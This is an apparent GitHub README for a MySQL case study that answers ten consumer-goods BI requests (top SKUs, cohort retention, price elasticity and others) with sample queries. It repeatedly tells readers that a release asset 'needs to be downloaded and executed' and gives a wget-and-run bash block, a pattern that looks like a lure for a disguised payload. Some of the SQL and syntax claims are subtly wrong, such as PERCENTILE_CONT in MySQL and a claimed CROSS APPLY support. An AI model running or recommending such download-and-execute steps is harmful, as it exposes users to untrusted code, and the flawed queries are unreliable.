[![Releases](https://img.shields.io/badge/Releases-v1.0-blue)](https://github.com/Eliyas-tech/Consumer-Goods/releases)  
https://github.com/Eliyas-tech/Consumer-Goods/releases

# Consumer Goods SQL Case Study: 10 Real-World BI Requests

🧾 📊 🧠  
![Retail shelf image](https://images.unsplash.com/photo-1523475496153-3d6cc4d8f607?auto=format&fit=crop&w=1600&q=80)

Table of contents
- About this repo
- Quick link
- What you get
- Data model
- How to run the release
- Setup and environment
- Ten business requests (detailed)
  - Request 1 — Top products by revenue (monthly)
  - Request 2 — Week-over-week growth by store
  - Request 3 — Top customers and lifetime value
  - Request 4 — SKU cannibalization
  - Request 5 — Promotion lift analysis
  - Request 6 — Stockout risk and lead time impact
  - Request 7 — Cohort retention by buyer segment
  - Request 8 — Price elasticity estimate
  - Request 9 — Regional cohort performance
  - Request 10 — Supplier on-time performance
- SQL patterns and techniques
  - Common table expressions (CTEs)
  - Window functions
  - Aggregation strategies
  - Joins and subqueries
  - Performance tips
- Example queries
- Sample outputs (mocked)
- Validation and test cases
- How to extend the case study
- Contributing
- License
- Releases

About this repo
This repository is a SQL-based case study. It answers ten ad-hoc business requests for a consumer goods company. The work shows advanced SQL skills. It uses CTEs, window functions, subqueries, and join patterns. The queries aim for clarity and repeatability. The scripts run on MySQL. The repo forms a reference for BI engineers and analysts.

Quick link
The release contains a packaged set of SQL scripts, sample CSVs, and a run script. Download and execute the release asset.  
Download and run: https://github.com/Eliyas-tech/Consumer-Goods/releases

What you get
- A set of SQL scripts for each business request.
- A master script to load sample data into a MySQL schema.
- CSV files for transactions, products, stores, promotions, and suppliers.
- A README with schema details and run instructions.
- Tests and sample result sets for validation.
- A small Python helper to run queries and export CSV results.

Why this is useful
- You can learn how to structure complex SQL logic.
- You can reuse query patterns in real projects.
- You can test performance techniques on real-like datasets.
- You can adapt the scripts to other SQL engines.

Data model
The case study uses a compact model. The model fits typical consumer goods workflows. The model emphasizes sales, inventory, pricing, and suppliers.

Primary tables
- transactions
  - transaction_id (PK)
  - trx_date (DATE)
  - store_id (FK -> stores)
  - product_id (FK -> products)
  - quantity (INT)
  - unit_price (DECIMAL)
  - promotion_id (FK -> promotions, NULL)
  - customer_id (FK -> customers)
- products
  - product_id (PK)
  - sku (VARCHAR)
  - product_name (VARCHAR)
  - category (VARCHAR)
  - brand (VARCHAR)
  - pack_size (VARCHAR)
- stores
  - store_id (PK)
  - name (VARCHAR)
  - region (VARCHAR)
  - open_date (DATE)
- promotions
  - promotion_id (PK)
  - promo_name (VARCHAR)
  - promo_type (ENUM: percent, fixed, bogo)
  - start_date (DATE)
  - end_date (DATE)
- inventory
  - inventory_id (PK)
  - store_id (FK)
  - product_id (FK)
  - snapshot_date (DATE)
  - on_hand (INT)
  - on_order (INT)
- suppliers
  - supplier_id (PK)
  - name (VARCHAR)
  - lead_time_days (INT)
  - region (VARCHAR)
- supply_orders
  - order_id (PK)
  - supplier_id (FK)
  - product_id (FK)
  - order_date (DATE)
  - received_date (DATE)
  - quantity (INT)
- customers
  - customer_id (PK)
  - first_name (VARCHAR)
  - last_name (VARCHAR)
  - join_date (DATE)
  - city (VARCHAR)
  - segment (VARCHAR)

How to run the release
The release page hosts a ZIP or TAR asset. Download the asset. Extract it. You will find:
- setup/schema.sql
- data/load_data.sql
- queries/request_01_top_products.sql ... request_10_supplier_perf.sql
- run_all.sh
- test/validate_results.sql

Steps
1. Download the release asset from the Releases page. The asset needs to be downloaded and executed.
2. Extract the archive.
3. Create a MySQL schema. For example:
   - CREATE DATABASE consumer_goods;
   - USE consumer_goods;
4. Run schema.sql to create tables.
5. Run load_data.sql to load the provided CSVs using LOAD DATA INFILE or your import tool.
6. Run run_all.sh or execute individual request scripts.

Example run commands (bash)
```bash
wget https://github.com/Eliyas-tech/Consumer-Goods/releases/download/v1.0/consumer-goods-v1.0.tar.gz
tar -xzf consumer-goods-v1.0.tar.gz
mysql -u root -p < consumer-goods/schema.sql
mysql -u root -p consumer_goods < consumer-goods/data/load_data.sql
bash consumer-goods/run_all.sh
```

Setup and environment
- MySQL 8.0 or compatible.
- Local machine with enough disk space for CSVs.
- Optional: Docker image with MySQL for isolation.
- Optional: MySQL client (DBeaver, MySQL Workbench).
- Optional: Python 3.8+ and pandas for result exports.

Docker quick start
```bash
docker run --name cg-mysql -e MYSQL_ROOT_PASSWORD=pass -e MYSQL_DATABASE=consumer_goods -p 3306:3306 -d mysql:8
# wait for startup
mysql -h 127.0.0.1 -P 3306 -u root -ppass consumer_goods < consumer-goods/schema.sql
mysql -h 127.0.0.1 -P 3306 -u root -ppass consumer_goods < consumer-goods/data/load_data.sql
```

Ten business requests (detailed)
Each request includes:
- Business goal
- Data sources used
- SQL strategy
- Key SQL features
- Query sample
- Output columns
- Validation checks

Request 1 — Top products by revenue (monthly)
Goal
Find top SKUs by revenue per month. Show top 10 per month. Provide revenue share and cumulative revenue.

Data sources
- transactions
- products

Strategy
- Aggregate revenue per sku per month.
- Rank SKUs by month using ROW_NUMBER().
- Compute cumulative revenue share using SUM() OVER().

Key SQL features
- CTEs for clean steps.
- DATE functions to bucket by month.
- Window functions: ROW_NUMBER, SUM OVER.

Sample query
```sql
WITH monthly AS (
  SELECT
    DATE_FORMAT(trx_date, '%Y-%m-01') AS month,
    p.sku,
    p.product_name,
    SUM(quantity * unit_price) AS revenue
  FROM transactions t
  JOIN products p ON t.product_id = p.product_id
  GROUP BY month, p.sku, p.product_name
),
ranked AS (
  SELECT
    month,
    sku,
    product_name,
    revenue,
    ROW_NUMBER() OVER (PARTITION BY month ORDER BY revenue DESC) AS rn,
    SUM(revenue) OVER (PARTITION BY month ORDER BY revenue DESC ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) AS cum_revenue
  FROM monthly
)
SELECT
  month,
  sku,
  product_name,
  revenue,
  cum_revenue,
  cum_revenue / SUM(revenue) OVER (PARTITION BY month) AS cum_share
FROM ranked
WHERE rn <= 10
ORDER BY month, revenue DESC;
```

Output columns
- month, sku, product_name, revenue, cum_revenue, cum_share

Validation checks
- Sum of monthly revenue equals total transactions revenue.
- No NULL SKUs in output.

Request 2 — Week-over-week growth by store
Goal
Compute week-over-week (WoW) revenue growth per store. Flag stores with >= 10% decline.

Data sources
- transactions
- stores

Strategy
- Aggregate revenue per store per ISO week.
- Use LAG() to get previous week revenue.
- Calculate growth rate.

Key SQL features
- Window function LAG()
- Date functions for ISO week
- CASE for flags

Sample query
```sql
WITH weekly AS (
  SELECT
    s.store_id,
    s.name AS store_name,
    YEARWEEK(trx_date, 3) AS yw,
    SUM(quantity * unit_price) AS revenue
  FROM transactions t
  JOIN stores s ON t.store_id = s.store_id
  GROUP BY s.store_id, yw
)
SELECT
  store_id,
  store_name,
  yw,
  revenue,
  LAG(revenue) OVER (PARTITION BY store_id ORDER BY yw) AS prev_revenue,
  CASE
    WHEN LAG(revenue) OVER (PARTITION BY store_id ORDER BY yw) IS NULL THEN NULL
    ELSE (revenue - LAG(revenue) OVER (PARTITION BY store_id ORDER BY yw)) / LAG(revenue) OVER (PARTITION BY store_id ORDER BY yw)
  END AS wow_growth,
  CASE
    WHEN (revenue - LAG(revenue) OVER (PARTITION BY store_id ORDER BY yw)) / NULLIF(LAG(revenue) OVER (PARTITION BY store_id ORDER BY yw),0) <= -0.10 THEN 'decline >=10%'
    ELSE 'ok'
  END AS flag
FROM weekly
ORDER BY store_id, yw DESC;
```

Output columns
- store_id, store_name, yw, revenue, prev_revenue, wow_growth, flag

Request 3 — Top customers and lifetime value
Goal
Compute customer lifetime value (LTV) and rank top 100 customers by LTV.

Data sources
- transactions
- customers

Strategy
- Aggregate total revenue per customer.
- Compute recency, frequency, and average order value (AOV).
- Rank by LTV.

Key SQL features
- GROUP BY, window rank

Sample query
```sql
WITH cust_rev AS (
  SELECT
    c.customer_id,
    CONCAT(c.first_name, ' ', c.last_name) AS customer_name,
    COUNT(DISTINCT trx_date) AS visits,
    SUM(quantity * unit_price) AS total_revenue,
    MAX(trx_date) AS last_purchase,
    MIN(trx_date) AS first_purchase
  FROM transactions t
  JOIN customers c ON t.customer_id = c.customer_id
  GROUP BY c.customer_id
)
SELECT
  customer_id,
  customer_name,
  visits,
  total_revenue,
  total_revenue / visits AS aov,
  DATEDIFF(CURRENT_DATE, first_purchase) AS days_active,
  ROW_NUMBER() OVER (ORDER BY total_revenue DESC) AS rank
FROM cust_rev
ORDER BY total_revenue DESC
LIMIT 100;
```

Output columns
- customer_id, customer_name, visits, total_revenue, aov, days_active, rank

Request 4 — SKU cannibalization
Goal
Identify SKUs that compete for the same customer within a short window. Flag potential cannibalization when a promotion on SKU A reduces sales of SKU B.

Data sources
- transactions
- promotions
- products

Strategy
- Pair transactions by customer within time window (e.g., 14 days).
- Aggregate lift/loss pre and post promotion.
- Use self-join on transactions with window functions.

Key SQL features
- SELF JOINs on transactions
- LAG/LEAD to align transaction sequences
- CTEs for pre/post promo windows

Sample query (simplified)
```sql
WITH promo_trx AS (
  SELECT t.*, p.promo_name
  FROM transactions t
  JOIN promotions p ON t.promotion_id = p.promotion_id
  WHERE p.promo_type = 'percent'
),
pairs AS (
  SELECT
    a.customer_id,
    a.trx_date AS date_a,
    a.product_id AS product_a,
    b.trx_date AS date_b,
    b.product_id AS product_b,
    DATEDIFF(b.trx_date, a.trx_date) AS days_between
  FROM promo_trx a
  JOIN transactions b ON a.customer_id = b.customer_id
  WHERE b.trx_date BETWEEN DATE_SUB(a.trx_date, INTERVAL 14 DAY) AND DATE_ADD(a.trx_date, INTERVAL 14 DAY)
    AND a.product_id <> b.product_id
)
SELECT
  product_a,
  product_b,
  COUNT(*) AS paired_count,
  SUM(CASE WHEN days_between > 0 THEN 1 ELSE 0 END) AS after_count,
  SUM(CASE WHEN days_between < 0 THEN 1 ELSE 0 END) AS before_count
FROM pairs
GROUP BY product_a, product_b
HAVING paired_count >= 50
ORDER BY paired_count DESC;
```

Output columns
- product_a, product_b, paired_count, after_count, before_count

Request 5 — Promotion lift analysis
Goal
Measure incremental lift from promotions. Compare promo sales to baseline.

Data sources
- transactions
- promotions
- products
- stores

Strategy
- Build treatment and control groups by store or SKU.
- Use pre/post windows to estimate baseline.
- Compute lift and confidence intervals (approximate).

Key SQL features
- CTEs for baseline and treatment
- Aggregation and window percentiles for basic uncertainty

Sample query (store-level, simplified)
```sql
WITH promo_sales AS (
  SELECT
    p.promotion_id,
    DATE_FORMAT(t.trx_date, '%Y-%m-01') AS month,
    SUM(t.quantity * t.unit_price) AS promo_revenue
  FROM transactions t
  JOIN promotions p ON t.promotion_id = p.promotion_id
  GROUP BY p.promotion_id, month
),
baseline AS (
  SELECT
    DATE_FORMAT(trx_date, '%Y-%m-01') AS month,
    SUM(quantity * unit_price) AS base_revenue
  FROM transactions
  WHERE promotion_id IS NULL
  GROUP BY month
)
SELECT
  ps.promotion_id,
  ps.month,
  promo_revenue,
  b.base_revenue,
  (promo_revenue - b.base_revenue) / NULLIF(b.base_revenue,0) AS lift
FROM promo_sales ps
JOIN baseline b USING (month)
ORDER BY ps.month DESC;
```

Output columns
- promotion_id, month, promo_revenue, base_revenue, lift

Request 6 — Stockout risk and lead time impact
Goal
Estimate stockout days per SKU per store. Correlate with supplier lead time.

Data sources
- inventory (snapshots)
- supply_orders
- suppliers
- transactions

Strategy
- Use inventory snapshots and daily sales rates to simulate days of cover.
- Flag SKUs where days of cover falls below threshold.
- Join supplier lead time to find risk sources.

Key SQL features
- Sliding window aggregation for recent sales rate
- JOINs to supply_orders and suppliers

Sample query (simplified)
```sql
WITH recent_sales AS (
  SELECT
    store_id,
    product_id,
    SUM(quantity) / 30.0 AS avg_daily_sales
  FROM transactions
  WHERE trx_date BETWEEN DATE_SUB(CURRENT_DATE, INTERVAL 30 DAY) AND CURRENT_DATE
  GROUP BY store_id, product_id
),
latest_inventory AS (
  SELECT store_id, product_id, on_hand
  FROM inventory
  WHERE snapshot_date = (SELECT MAX(snapshot_date) FROM inventory)
)
SELECT
  li.store_id,
  li.product_id,
  li.on_hand,
  rs.avg_daily_sales,
  li.on_hand / NULLIF(rs.avg_daily_sales,0) AS days_of_cover,
  s.lead_time_days,
  CASE WHEN li.on_hand / NULLIF(rs.avg_daily_sales,0) < s.lead_time_days THEN 'high_risk' ELSE 'ok' END AS risk_flag
FROM latest_inventory li
LEFT JOIN recent_sales rs ON li.store_id = rs.store_id AND li.product_id = rs.product_id
LEFT JOIN suppliers s ON s.supplier_id = (
  SELECT supplier_id FROM supply_orders so WHERE so.product_id = li.product_id ORDER BY order_date DESC LIMIT 1
)
ORDER BY days_of_cover ASC;
```

Output columns
- store_id, product_id, on_hand, avg_daily_sales, days_of_cover, lead_time_days, risk_flag

Request 7 — Cohort retention by buyer segment
Goal
Track cohorts by first purchase month. Show retention curves by segment.

Data sources
- transactions
- customers

Strategy
- Determine cohort_month per customer.
- Bucket subsequent purchases by month offset from cohort.
- Compute retention rate per month offset and segment.

Key SQL features
- DATE functions and DENSE_RANK
- GROUP BY and window SUM for retention curves

Sample query
```sql
WITH first_purchase AS (
  SELECT
    c.customer_id,
    c.segment,
    DATE_FORMAT(MIN(t.trx_date), '%Y-%m-01') AS cohort_month
  FROM transactions t
  JOIN customers c ON t.customer_id = c.customer_id
  GROUP BY c.customer_id, c.segment
),
customer_months AS (
  SELECT
    fp.customer_id,
    fp.segment,
    fp.cohort_month,
    DATE_FORMAT(t.trx_date, '%Y-%m-01') AS activity_month,
    TIMESTAMPDIFF(MONTH, fp.cohort_month, DATE_FORMAT(t.trx_date, '%Y-%m-01')) AS month_offset
  FROM first_purchase fp
  JOIN transactions t ON fp.customer_id = t.customer_id
)
SELECT
  segment,
  cohort_month,
  month_offset,
  COUNT(DISTINCT customer_id) AS active_customers,
  COUNT(DISTINCT customer_id) / SUM(COUNT(DISTINCT customer_id)) OVER (PARTITION BY segment, cohort_month ORDER BY month_offset ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING) AS retention_rate
FROM customer_months
GROUP BY segment, cohort_month, month_offset
ORDER BY segment, cohort_month, month_offset;
```

Output columns
- segment, cohort_month, month_offset, active_customers, retention_rate

Request 8 — Price elasticity estimate
Goal
Estimate short-run price elasticity per SKU. Use times when price changed.

Data sources
- transactions
- products
- promotions

Strategy
- Identify price bands per SKU by time.
- Compute percent change in price and percent change in quantity.
- Use elasticity = pct_qty_change / pct_price_change.

Key SQL features
- LAG() for previous price
- CTEs to aggregate by price period

Sample query (simplified)
```sql
WITH sku_price AS (
  SELECT
    product_id,
    trx_date,
    AVG(unit_price) AS avg_price,
    SUM(quantity) AS total_qty
  FROM transactions
  GROUP BY product_id, trx_date
),
price_changes AS (
  SELECT
    product_id,
    trx_date,
    avg_price,
    total_qty,
    LAG(avg_price) OVER (PARTITION BY product_id ORDER BY trx_date) AS prev_price,
    LAG(total_qty) OVER (PARTITION BY product_id ORDER BY trx_date) AS prev_qty
  FROM sku_price
)
SELECT
  product_id,
  trx_date,
  (total_qty - prev_qty) / NULLIF(prev_qty,0) AS pct_qty_change,
  (avg_price - prev_price) / NULLIF(prev_price,0) AS pct_price_change,
  ((total_qty - prev_qty) / NULLIF(prev_qty,0)) / NULLIF((avg_price - prev_price) / NULLIF(prev_price,0),0) AS elasticity
FROM price_changes
WHERE prev_price IS NOT NULL
  AND ABS((avg_price - prev_price) / NULLIF(prev_price,0)) > 0.005
ORDER BY product_id, trx_date;
```

Output columns
- product_id, trx_date, pct_qty_change, pct_price_change, elasticity

Request 9 — Regional cohort performance
Goal
Compare new stores by region. Show revenue ramp for stores opened in last 24 months.

Data sources
- stores
- transactions

Strategy
- Identify store open_date cohorts by month.
- Aggregate revenue per store by month since open.
- Compute median ramp and percentiles by region.

Key SQL features
- DATEDIFF and TIMESTAMPDIFF
- Window functions for percentiles (approx)

Sample query (simplified)
```sql
WITH store_cohort AS (
  SELECT
    store_id,
    region,
    DATE_FORMAT(open_date, '%Y-%m-01') AS cohort_month
  FROM stores
  WHERE open_date >= DATE_SUB(CURRENT_DATE, INTERVAL 24 MONTH)
),
store_revenue AS (
  SELECT
    sc.store_id,
    sc.region,
    sc.cohort_month,
    DATE_FORMAT(t.trx_date, '%Y-%m-01') AS rev_month,
    TIMESTAMPDIFF(MONTH, sc.open_date, t.trx_date) AS months_since_open,
    SUM(t.quantity * t.unit_price) AS revenue
  FROM store_cohort sc
  JOIN transactions t ON sc.store_id = t.store_id
  GROUP BY sc.store_id, sc.region, sc.cohort_month, rev_month, months_since_open
)
SELECT
  region,
  months_since_open,
  PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY revenue) OVER (PARTITION BY region, months_since_open) AS median_revenue
FROM store_revenue
GROUP BY region, months_since_open
ORDER BY region, months_since_open;
```

Output columns
- region, months_since_open, median_revenue

Request 10 — Supplier on-time performance
Goal
Measure supplier punctuality. Flag suppliers with > 20% late shipments.

Data sources
- supply_orders
- suppliers

Strategy
- Compute on-time if received_date <= order_date + lead_time
- Aggregate counts and percent late.

Key SQL features
- CASE with date arithmetic
- Aggregation

Sample query
```sql
SELECT
  s.supplier_id,
  s.name,
  COUNT(*) AS total_orders,
  SUM(CASE WHEN received_date <= DATE_ADD(order_date, INTERVAL s.lead_time_days DAY) THEN 1 ELSE 0 END) AS on_time,
  SUM(CASE WHEN received_date > DATE_ADD(order_date, INTERVAL s.lead_time_days DAY) THEN 1 ELSE 0 END) AS late,
  SUM(CASE WHEN received_date > DATE_ADD(order_date, INTERVAL s.lead_time_days DAY) THEN 1 ELSE 0 END) / COUNT(*) AS pct_late
FROM supply_orders so
JOIN suppliers s ON so.supplier_id = s.supplier_id
GROUP BY s.supplier_id, s.name
HAVING pct_late > 0.20
ORDER BY pct_late DESC;
```

Output columns
- supplier_id, name, total_orders, on_time, late, pct_late

SQL patterns and techniques
Common table expressions (CTEs)
- Use CTEs to break complex logic into named steps.
- Keep each CTE focused on one transformation.
- Name CTEs like base_sales, monthly_agg, ranked_top, diff_calc.

Window functions
- Use ROW_NUMBER() to rank.
- Use RANK() or DENSE_RANK() if ties matter.
- Use LAG() and LEAD() to compare adjacent rows.
- Use SUM() OVER() to compute running totals and shares.

Aggregation strategies
- Aggregate before joining when possible to reduce row counts.
- Use COUNT(DISTINCT ...) with caution on large sets; prefer pre-aggregation.
- Use SUM(quantity * price) to compute revenue in one step.

Joins and subqueries
- Prefer explicit JOIN clauses for clarity.
- Use lateral-like patterns via subqueries to fetch small aggregated metrics per row (MySQL supports lateral with CROSS APPLY via derived tables).
- Avoid unbounded cross joins.

Performance tips
- Index foreign keys and date columns used for filters.
- Load sample data with LOCAL INFILE for speed.
- Use EXPLAIN for expensive queries.
- Use temporary summary tables when queries run too long.
- Use LIMIT during development to reduce runtime.

Example queries
Every query in the release includes an explanatory header. The header lists:
- Goal
- Tables used
- Estimated runtime on 1M rows
- Output sample

Here is a compact example that shows a multi-step approach with a CTE and window functions. It computes top N products per region by revenue and shows month-over-month change.

```sql
WITH region_month AS (
  SELECT
    s.region,
    DATE_FORMAT(t.trx_date, '%Y-%m-01') AS month,
    p.sku,
    SUM(t.quantity * t.unit_price) AS revenue
  FROM transactions t
  JOIN stores s ON t.store_id = s.store_id
  JOIN products p ON t.product_id = p.product_id
  GROUP BY s.region, month, p.sku
),
ranked AS (
  SELECT
    region,
    month,
    sku,
    revenue,
    ROW_NUMBER() OVER (PARTITION BY region, month ORDER BY revenue DESC) AS rn
  FROM region_month
)
SELECT
  r1.region,
  r1.month,
  r1.sku,
  r1.revenue,
  r1.rn,
  r1.revenue - COALESCE(r2.revenue,0) AS change_vs_prev_month
FROM ranked r1
LEFT JOIN ranked r2
  ON r1.region = r2.region
  AND r1.sku = r2.sku
  AND DATE_FORMAT(DATE_SUB(r1.month, INTERVAL 1 MONTH), '%Y-%m-01') = r2.month
WHERE r1.rn <= 5
ORDER BY region, month, r1.revenue DESC;
```

Sample outputs (mocked)
The release includes CSV files with sample outputs for each request. The outputs help you validate results. Here are a few mock rows.

Top products by month (sample)
- 2024-06, SKU-123, Chocolate Bar, 12500.00, 12500.00, 0.12
- 2024-06, SKU-987, Sparkling Water, 9800.00, 22300.00, 0.21

Week-over-week growth (sample)
- store_01, 202426, 15000.00, 13500.00, 0.1111, ok
- store_02, 202426, 8000.00, 9500.00, -0.1579, decline >=10%

LTV top customers (sample)
- cust_101, John Doe, 24, 5420.00, 225.83, 365, 1

Validation and test cases
Each query includes a small test script. Tests assert:
- Row counts match expected samples.
- No NULLs in primary columns.
- Aggregates match precomputed totals.

Sample test SQL
```sql
SELECT
  (SELECT SUM(quantity * unit_price) FROM transactions) AS total_trx_revenue,
  (SELECT SUM(revenue) FROM (SELECT SUM(quantity * unit_price) AS revenue FROM transactions GROUP BY DATE_FORMAT(trx_date,'%Y-%m-01')) t) AS sum_monthly_revenue;
```
The two values must match.

How to extend the case study
- Add new business requests.
- Swap MySQL for PostgreSQL and adapt syntax for percentiles and date functions.
- Increase sample size with synthetic generators.
- Add a Jupyter notebook that reads SQL results and builds charts.

Visualization ideas
- Top SKUs dashboard with cumulative share and Pareto charts.
- Heatmap of SKU cannibalization pairs.
- Retention curves by segment.
- Store performance map by region.

Contributing
- Fork the repo.
- Add scripts or data under a new folder.
- Add tests for new queries in test/.
- Open a pull request with a clear description.
- Use issues to propose new business questions.

Repository layout (example)
- README.md
- schema.sql
- data/
  - transactions.csv
  - products.csv
  - stores.csv
  - promotions.csv
  - inventory.csv
  - suppliers.csv
  - supply_orders.csv
  - customers.csv
- queries/
  - request_01_top_products.sql
  - request_02_week_over_week.sql
  - ...
- scripts/
  - run_all.sh
  - load_data_helper.py
- test/
  - validate_results.sql
- docs/
  - query_notes.md
  - performance_tips.md

Common pitfalls and checks
- Check date zones. Use DATE functions with care.
- Check division by zero. Use NULLIF where needed.
- Check duplicate transaction IDs in sample data.
- Validate foreign key integrity after load.

Index suggestions
- transactions(trx_date)
- transactions(product_id)
- transactions(store_id)
- transactions(customer_id)
- inventory(snapshot_date)
- supply_orders(order_date)
- promotions(start_date, end_date)

Permissions and security
- Keep data files local when they contain sensitive info.
- Use least-privilege MySQL user for running automation scripts.
- Use parameterized queries from external apps.

Useful SQL utilities
- Use GROUP_CONCAT for simple lists.
- Use JSON functions if you store event data as JSON.
- Use stored procedures for repeatable ETL steps when needed.

Images and diagrams
- ER diagram: create a simple ER image and place in docs/er_diagram.png.
- Chart samples: Use PNGs in docs/visuals/.

Badges and release link
Click the Releases badge or visit the release page to download the packaged scripts and example data. The asset needs to be downloaded and executed.  
[![Download Release](https://img.shields.io/badge/Download-Release-blue?logo=github)](https://github.com/Eliyas-tech/Consumer-Goods/releases)

Releases
Visit the Releases page for packaged assets, changelogs, and versioned scripts. The release asset contains the SQL file and helper scripts that you must download and run. https://github.com/Eliyas-tech/Consumer-Goods/releases

License
This repository uses the MIT License. See LICENSE file for details.

Credits and resources
- SQL reference: MySQL 8.0 manual
- Sample data ideas: public retail datasets, retailbanking examples
- Images: Unsplash (retail and shelf photos)

Contact and support
Create issues for questions or suggestions. Use PRs for code changes.